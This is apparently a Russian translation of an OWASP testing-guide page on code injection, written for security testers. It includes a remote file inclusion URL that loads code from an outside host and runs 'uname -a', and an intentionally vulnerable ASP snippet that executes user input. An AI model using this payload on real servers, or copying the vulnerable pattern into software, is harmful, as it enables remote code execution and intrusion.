---

layout: col-document
title: WSTG - Latest
tags: WSTG

---

{% include breadcrumb.html %}
# Тестирование инъекции кода

|ID          |
|------------|
|WSTG-INPV-11|

## Обзор

В этом разделе описывается, как тестировщик может проверить, можно ли ввести код в качестве входных данных на web-странице и выполнить его на web-сервере.

При тестировании [инъекции кода](https://owasp.org/www-community/attacks/Code_Injection) тестировщик отправляет входные данные, которые обрабатываются web-сервером как динамический код или как включенный файл. Эти тесты могут быть нацелены на различные серверные скриптовые фреймворки, например, ASP или PHP. Для защиты от этих атак необходимо использовать надлежащий контроль входных данных и методы безопасной разработки.

## Задачи тестирования

- Найти точки для инъекции, где вы можете вставить код в приложение.
- Оценить воздействие инъекции.

## Как тестировать

### Тестирование методом чёрного ящика

#### Тестирование уязвимостей PHP-инъекций

Используя строку запроса, тестировщик может ввести код (в данном примере вредоносный URL), который будет обработан как часть включенного файла:

`http://www.example.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a`

> Вредоносный URL принимается в качестве параметра для страницы PHP, которая позже будет использовать это значение во включенном файле.

### Тестирование методом серого ящика

#### Тестирование на наличие уязвимостей для инъекции кода ASP

Проанализируйте код ASP на предмет пользовательского ввода в функциях выполнения. Может ли пользователь вводить команды в поле ввода данных? Здесь код ASP сохранит входные данные в файл, а затем выполнит его:

```asp
<%
If not isEmpty(Request( "Data" ) ) Then
Dim fso, f
'User input Data is written to a file named data.txt
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.OpenTextFile(Server.MapPath( "data.txt" ), 8, True)
f.Write Request("Data") & vbCrLf
f.close
Set f = nothing
Set fso = Nothing

'Data.txt is executed
Server.Execute( "data.txt" )

Else
%>

<form>
<input name="Data" /><input type="submit" name="Enter Data" />

</form>
<%
End If
%>)))
```

### Ссылки

- [Security Focus](http://www.securityfocus.com)
- [Insecure.org](http://www.insecure.org)
- [Wikipedia](https://en.wikipedia.org/wiki/Code_injection)
- [Reviewing Code for OS Injection](https://wiki.owasp.org/index.php/OS_Injection)
